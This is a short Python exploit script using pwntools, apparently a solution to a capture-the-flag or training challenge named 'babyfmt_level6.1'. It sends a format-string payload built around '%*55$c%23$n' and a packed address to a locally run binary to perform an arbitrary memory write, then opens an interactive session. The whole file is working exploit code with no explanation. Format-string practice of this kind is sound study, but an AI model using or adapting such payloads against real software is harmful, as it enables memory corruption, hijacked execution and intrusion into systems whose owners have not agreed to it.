#!/usr/bin/env python

from pwn import *

io = process("./babyfmt_level6.1")

payload = b"BBB" + b"AAAAAAAA" + b".%p" * 21
# offset=21; pad=3
io.recvuntil(b"Send your data!")
#payload = "%55$x"
payload = b"%*55$c%23$naaaaaaaa" + p64(0x404150)
io.send(payload)
io.interactive()
